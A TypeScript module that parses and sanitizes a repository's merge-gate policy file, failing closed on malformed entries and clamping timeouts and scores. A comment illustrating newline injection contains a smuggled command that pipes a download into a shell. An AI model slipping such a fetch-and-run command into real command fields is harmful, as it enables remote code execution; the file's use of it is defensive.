import YAML from "yaml";
import { sanitizeDeploys } from "../deploy/config";
import { readFileFromRepo } from "../storage/git-ops";
import { type Logger, defaultLogger } from "../utils/logger";
import {
  MAX_COMMAND_LENGTH,
  MAX_PHASE_TIMEOUT_MS,
  MAX_TOTAL_BUDGET_MS,
  MIN_PHASE_TIMEOUT_MS,
  MIN_TOTAL_BUDGET_MS,
} from "./limits";
import type { EvalPolicy, EvaluatorConfig, MergePolicy, SandboxEvaluatorConfig } from "./types";

const DEFAULT_POLICY: EvalPolicy = {
  evaluators: [{ type: "diff" }],
  requireAll: true,
  minScore: 0.7,
};

/**
 * Repo files that define merge protection. A change that edits one of these is
 * altering the gate itself, so the merge path treats it specially (SA-3): such a
 * change requires a human approval and cannot be force-merged, so a writer can't
 * silently relax protection for later changes.
 */
export const PROTECTED_CONFIG_FILES = [".stratum/policy.yaml", "stratum.config.json"] as const;

/** Does a unified diff (git-style `diff --git a/… b/…` headers) modify a
 *  protected merge-protection config file? */
export function diffTouchesProtectedConfig(diff: string): boolean {
  return PROTECTED_CONFIG_FILES.some((path) => diff.includes(`diff --git a/${path} b/${path}`));
}

/** Outcome of parsing policy-file bytes: the file either yields a policy or it does not. */
export type PolicyParse =
  | { status: "ok"; policy: EvalPolicy }
  | { status: "malformed"; reason: string };

/** `PolicyParse` plus the one outcome only a *fetch* can produce. */
type PolicyLoad = PolicyParse | { status: "absent" };

export async function loadPolicy(
  remote: string,
  token: string,
  logger: Logger,
  branch = "main",
): Promise<EvalPolicy> {
  const yaml = await readAndParsePolicy(
    remote,
    token,
    ".stratum/policy.yaml",
    "yaml",
    logger,
    branch,
  );
  if (yaml.status === "ok") return yaml.policy;
  if (yaml.status === "malformed")
    return malformedPolicy(".stratum/policy.yaml", yaml.reason, logger);

  const json = await readAndParsePolicy(
    remote,
    token,
    "stratum.config.json",
    "json",
    logger,
    branch,
  );
  if (json.status === "ok") return json.policy;
  if (json.status === "malformed")
    return malformedPolicy("stratum.config.json", json.reason, logger);

  return DEFAULT_POLICY;
}

/**
 * A policy file was present but unparseable. Do NOT silently fall back to the
 * permissive default — log loudly and carry a configError so the merge gate
 * fails closed until the file is fixed. Evaluation still runs (on the default
 * evaluators) so the change flow isn't wholly broken by a typo.
 */
function malformedPolicy(path: string, reason: string, logger: Logger): EvalPolicy {
  const configError = `Policy file ${path} is present but invalid (${reason}); merges are blocked until it is fixed.`;
  logger.error("Malformed policy file — failing merge gate closed", undefined, { path, reason });
  return {
    ...DEFAULT_POLICY,
    configError,
    // A malformed file has no usable `deploys`, and leaving that as an absent
    // field would mean a single YAML typo silently stops production updating —
    // the quietest possible failure. Deliberately *not* salvaged: the parse
    // failed, so there is no way to tell which half of the file the typo
    // corrupted, and a truncated document can yield a structurally valid
    // `deploys` list that says something the author never wrote. Instead the
    // policy carries one rejection, which the deploy runner persists as a named
    // failed deployment pointing at the file.
    deployRejections: [
      {
        name: null,
        reason: `Policy file ${path} is present but invalid (${reason}); no deploy configuration could be read from it.`,
      },
    ],
  };
}

/**
 * Parse and sanitize the bytes of a policy file.
 *
 * Split out of `readAndParsePolicy` so parsing is separable from fetching: the
 * deploy runner reads the tree *pinned at a merge commit* and must parse the
 * policy out of those bytes. Re-reading via `loadPolicy` would take the branch
 * tip instead, letting a newer policy apply to an older tree.
 *
 * Never throws: a sanitization failure is returned as `malformed`.
 */
export function parsePolicyContent(
  content: string,
  format: "json" | "yaml",
  logger: Logger = defaultLogger,
): PolicyParse {
  let parsed: unknown;
  try {
    parsed = format === "json" ? JSON.parse(content) : YAML.parse(content);
  } catch (e) {
    return { status: "malformed", reason: e instanceof Error ? e.message : "parse error" };
  }

  if (
    typeof parsed !== "object" ||
    parsed === null ||
    !("evaluators" in parsed) ||
    !Array.isArray((parsed as Record<string, unknown>).evaluators)
  ) {
    return { status: "malformed", reason: "missing or non-array 'evaluators'" };
  }

  const raw = parsed as Record<string, unknown>;

  // Sanitization gets its own catch. A throw in here is a statement about
  // *this file* — a YAML alias cycle, say — not a transient read blip, and
  // the caller's "treat as absent" would fall back to the permissive
  // default with no `configError`, silently discarding the file's merge
  // protection. Fail closed instead.
  try {
    const merge = sanitizeMergePolicy(raw.merge);
    const {
      merge: _unsanitized,
      configError: _ce,
      // Destructured out for the same reason `merge` is: the spread below
      // copies whatever the file said into these fields, so leaving them in
      // would hand downstream code the *unsanitized* parsed value, by
      // reference. Both are rebuilt further down.
      deploys: _rawDeploys,
      deployRejections: _rawRejections,
      ...policy
    } = {
      ...DEFAULT_POLICY,
      ...(parsed as Partial<EvalPolicy>),
    };

    // Rebuilt rather than taken from the spread: every entry must be a fresh
    // object owned by this policy, so nothing downstream can reach back into
    // the parsed input (or, via `DEFAULT_POLICY`'s own array, into the module
    // default) by mutating what it was handed.
    const declared = raw.evaluators as unknown[];
    const evaluators = declared
      .map((entry) => sanitizeEvaluator(entry, logger))
      .filter((entry): entry is EvaluatorConfig => entry !== null);

    // Any dropped entry fails the gate closed — not just the case where every
    // entry was dropped. An entry the author wrote is a gate they meant to
    // have; silently discarding one while its siblings survive removes that
    // gate and lets the change through on the remaining ones, which is the
    // permissive fallback `malformedPolicy` exists to prevent. A `webhook`
    // whose `url` was typo'd is the concrete case: it used to reach
    // `WebhookEvaluator` and block on an unusable URL.
    //
    // Note this only counts entries that are structurally unusable. An
    // unrecognised `type` is copied through and rejected downstream by
    // `buildEvaluators`, so a policy naming a future evaluator type does not
    // trip this.
    if (evaluators.length < declared.length) {
      return {
        status: "malformed",
        reason: `${declared.length - evaluators.length} unusable entr${
          declared.length - evaluators.length === 1 ? "y" : "ies"
        } in 'evaluators'`,
      };
    }
    policy.evaluators = evaluators;

    // Assigned unconditionally: the spread above already put the *raw* value
    // in `policy.minScore`, so skipping the assignment on rejection would
    // leave it there — and `-Infinity` or the string "-5" both make
    // `score >= minScore` true for every score, disabling the gate.
    policy.minScore = clampScore(raw.minScore, logger) ?? DEFAULT_POLICY.minScore;

    // Rebuilt for the same reason `evaluators` is, and assigned only from the
    // sanitizer's output — never from the spread. A rejected entry does *not*
    // fail the file closed the way a dropped evaluator does; it is carried on
    // the policy so the deploy runner can persist it as a named failed
    // deployment. `sanitizeDeploys` explains why the two differ.
    const { accepted, rejected } = sanitizeDeploys(raw.deploys);

    const sanitized: EvalPolicy = { ...policy };
    if (merge) sanitized.merge = merge;
    if (accepted.length > 0) sanitized.deploys = accepted;
    if (rejected.length > 0) sanitized.deployRejections = rejected;

    return { status: "ok", policy: sanitized };
  } catch (e) {
    const reason = e instanceof Error ? e.message : String(e);
    logger.error("Policy sanitization threw — failing merge gate closed", undefined, {
      format,
      reason,
    });
    return { status: "malformed", reason };
  }
}

async function readAndParsePolicy(
  remote: string,
  token: string,
  path: string,
  format: "json" | "yaml",
  logger: Logger,
  branch = "main",
): Promise<PolicyLoad> {
  try {
    const contentResult = await readFileFromRepo(remote, token, path, logger, branch);
    if (!contentResult.success) return { status: "absent" };

    const content = contentResult.data;
    if (content === null || content === undefined) return { status: "absent" };

    return parsePolicyContent(content, format, logger);
  } catch (e) {
    // A transient repo-read blip — treat as absent so it doesn't block every
    // merge. Sanitization failures cannot reach here; `parsePolicyContent`
    // handles them itself and fails closed.
    logger.warn("Policy load failed; treating as absent", {
      path,
      error: e instanceof Error ? e.message : String(e),
    });
    return { status: "absent" };
  }
}

/** Longest attacker-supplied value echoed into a log line. */
const MAX_LOGGED_VALUE_LENGTH = 100;

/**
 * Render a rejected value for a log line without letting it set the log's size.
 *
 * `JSON.stringify` throws on a circular structure, and a YAML alias cycle
 * (`evaluators: &e [*e]`) produces one from a perfectly well-formed file — so
 * this must not be the thing that decides whether a policy loads.
 */
function forLog(value: unknown): string {
  let rendered: string;
  try {
    rendered = typeof value === "string" ? (value ?? "") : (JSON.stringify(value) ?? String(value));
  } catch {
    rendered = Object.prototype.toString.call(value);
  }
  return rendered.slice(0, MAX_LOGGED_VALUE_LENGTH);
}

/**
 * Clamp a policy-supplied duration into range, or drop it so the caller's
 * default applies.
 *
 * A clamp is deliberately *not* a malformed policy: it sets no `configError`
 * and blocks no merge. `configError` exists for a policy that could not be
 * understood at all; an out-of-range timeout is a bounded mistake that is safe
 * to correct, and escalating it to a merge block would be hostile to projects
 * that already have one.
 */
function clampDuration(
  raw: unknown,
  bounds: { min: number; max: number },
  field: string,
  logger: Logger,
): number | undefined {
  if (typeof raw !== "number" || !Number.isFinite(raw)) {
    // NaN and ±Infinity are `typeof "number"`, so "non-numeric" would misdirect
    // an operator debugging `totalBudgetMs: .inf`; include the value they wrote.
    if (raw !== undefined) {
      logger.warn("Ignoring policy field that is not a finite number", {
        field,
        submitted: forLog(raw),
      });
    }
    return undefined;
  }
  const clamped = Math.min(bounds.max, Math.max(bounds.min, raw));
  if (clamped !== raw) {
    logger.warn("Clamped out-of-range policy field", {
      field,
      submitted: forLog(raw),
      applied: clamped,
    });
  }
  return clamped;
}

/**
 * Clamp the aggregate pass threshold into `[0, 1]`, or drop it so the default
 * applies. A score outside that range would make every change pass (or none),
 * silently disabling the gate the policy exists to enforce.
 */
function clampScore(raw: unknown, logger: Logger): number | undefined {
  if (typeof raw !== "number" || !Number.isFinite(raw)) {
    if (raw !== undefined) {
      logger.warn("Ignoring policy field that is not a finite number", {
        field: "minScore",
        submitted: forLog(raw),
      });
    }
    return undefined;
  }
  const clamped = Math.min(1, Math.max(0, raw));
  if (clamped !== raw) {
    logger.warn("Clamped out-of-range policy field", {
      field: "minScore",
      submitted: forLog(raw),
      applied: clamped,
    });
  }
  return clamped;
}

/** Fields a `sandbox` evaluator entry may carry; anything else is a typo worth flagging. */
const SANDBOX_CONFIG_KEYS = new Set([
  "type",
  "command",
  "timeoutMs",
  "installTimeoutMs",
  "totalBudgetMs",
  "allowInstallScripts",
]);

/**
 * Keep only well-typed fields from a user-supplied `sandbox` evaluator entry.
 *
 * Always returns a fresh object rather than clamping the parsed entry in place,
 * so the returned policy shares no object identity with the parsed input and
 * nothing downstream can reach back into it.
 */
function sanitizeSandboxConfig(
  source: Record<string, unknown>,
  logger: Logger,
): SandboxEvaluatorConfig {
  const config: SandboxEvaluatorConfig = { type: "sandbox" };

  // Because this rebuilds a whitelisted object, an unrecognised key would
  // otherwise vanish in silence — and `timeout` for `timeoutMs` is the exact
  // typo a project owner is most likely to make and least likely to notice.
  for (const key of Object.keys(source)) {
    if (!SANDBOX_CONFIG_KEYS.has(key)) {
      logger.warn("Ignoring unrecognized sandbox evaluator field", { field: key });
    }
  }

  // Rejecting newlines is load-bearing, not tidiness: "npm test\ncurl x | sh"
  // is one string to a naive check and two commands to a shell.
  if (typeof source.command === "string") {
    const command = source.command.trim();
    if (command && command.length <= MAX_COMMAND_LENGTH && !/[\r\n]/.test(command)) {
      config.command = command;
    } else {
      logger.warn("Ignoring invalid sandbox command", { submitted: forLog(source.command) });
    }
  } else if (source.command !== undefined) {
    logger.warn("Ignoring non-string sandbox command", { submitted: forLog(source.command) });
  }

  const phaseBounds = { min: MIN_PHASE_TIMEOUT_MS, max: MAX_PHASE_TIMEOUT_MS };
  const timeoutMs = clampDuration(source.timeoutMs, phaseBounds, "sandbox.timeoutMs", logger);
  if (timeoutMs !== undefined) config.timeoutMs = timeoutMs;

  const installTimeoutMs = clampDuration(
    source.installTimeoutMs,
    phaseBounds,
    "sandbox.installTimeoutMs",
    logger,
  );
  if (installTimeoutMs !== undefined) config.installTimeoutMs = installTimeoutMs;

  const totalBudgetMs = clampDuration(
    source.totalBudgetMs,
    { min: MIN_TOTAL_BUDGET_MS, max: MAX_TOTAL_BUDGET_MS },
    "sandbox.totalBudgetMs",
    logger,
  );
  if (totalBudgetMs !== undefined) config.totalBudgetMs = totalBudgetMs;

  if (typeof source.allowInstallScripts === "boolean") {
    config.allowInstallScripts = source.allowInstallScripts;
  } else if (source.allowInstallScripts !== undefined) {
    logger.warn("Ignoring non-boolean sandbox.allowInstallScripts", {
      submitted: forLog(source.allowInstallScripts),
    });
  }

  return config;
}

/**
 * Validate one entry of the user-supplied `evaluators` array.
 *
 * Returns null for anything that is not an object with a string `type`. The
 * array guard in `readAndParsePolicy` only checks `Array.isArray`, so entries
 * like `null` or `"sandbox"` reach `buildEvaluators` and throw on `.type`
 * access — dropping them here is what keeps a typo in a policy file from
 * crashing every change on the project.
 *
 * Entries whose `type` this function does not clamp are copied through, not
 * passed through by reference, so a returned policy never shares object
 * identity with the parsed input or with `DEFAULT_POLICY`.
 */
function sanitizeEvaluator(raw: unknown, logger: Logger): EvaluatorConfig | null {
  if (typeof raw !== "object" || raw === null || Array.isArray(raw)) {
    logger.warn("Dropping non-object evaluator entry", { submitted: forLog(raw) });
    return null;
  }
  const source = raw as Record<string, unknown>;
  if (typeof source.type !== "string") {
    logger.warn("Dropping evaluator entry without a string type", { submitted: forLog(raw) });
    return null;
  }

  if (source.type === "sandbox") return sanitizeSandboxConfig(source, logger);

  if (source.type === "webhook") {
    // `url` is required by the type, so check it rather than asserting it. The
    // evaluator does fail closed on a missing URL, but telling the compiler a
    // value is a `webhook` config when it may have no `url` is exactly the kind
    // of false claim the no-`any` rule exists to prevent.
    if (typeof source.url !== "string") {
      logger.warn("Dropping webhook evaluator entry without a url", {
        submitted: forLog(raw),
      });
      return null;
    }
    // The same unbounded-timeout defect the sandbox entry had, one array
    // element over: `webhook-evaluator` reads this straight from policy.
    const timeoutMs = clampDuration(
      source.timeoutMs,
      { min: MIN_PHASE_TIMEOUT_MS, max: MAX_PHASE_TIMEOUT_MS },
      "webhook.timeoutMs",
      logger,
    );
    const webhook: EvaluatorConfig = { type: "webhook", url: source.url };
    if (typeof source.secret === "string") webhook.secret = source.secret;
    if (timeoutMs !== undefined) webhook.timeoutMs = timeoutMs;
    return webhook;
  }

  // Evaluator types this function does not model are copied through so a new
  // type is not silently dropped before `buildEvaluators` can reject it. The
  // assertion is narrower than it looks — `type` is known to be a string, and
  // an unknown one is discarded there with a warning.
  return { ...source } as EvaluatorConfig;
}

/** Keep only well-typed merge-protection fields from user-supplied config. */
function sanitizeMergePolicy(raw: unknown): MergePolicy | null {
  if (typeof raw !== "object" || raw === null || Array.isArray(raw)) return null;
  const source = raw as Record<string, unknown>;
  const merge: MergePolicy = {};

  if (
    typeof source.requiredApprovals === "number" &&
    Number.isInteger(source.requiredApprovals) &&
    source.requiredApprovals >= 0
  ) {
    merge.requiredApprovals = source.requiredApprovals;
  }
  if (
    Array.isArray(source.requiredEvaluators) &&
    source.requiredEvaluators.every((entry) => typeof entry === "string")
  ) {
    merge.requiredEvaluators = source.requiredEvaluators;
  }
  if (typeof source.allowForce === "boolean") {
    merge.allowForce = source.allowForce;
  }
  if (typeof source.requireFreshBase === "boolean") {
    merge.requireFreshBase = source.requireFreshBase;
  }
  if (typeof source.postMergeCommand === "string" && source.postMergeCommand.trim()) {
    merge.postMergeCommand = source.postMergeCommand.trim();
  }
  if (
    typeof source.postMergeTimeoutMs === "number" &&
    Number.isFinite(source.postMergeTimeoutMs) &&
    source.postMergeTimeoutMs > 0
  ) {
    merge.postMergeTimeoutMs = source.postMergeTimeoutMs;
  }
  if (typeof source.autoRevert === "boolean") {
    merge.autoRevert = source.autoRevert;
  }

  return Object.keys(merge).length > 0 ? merge : null;
}
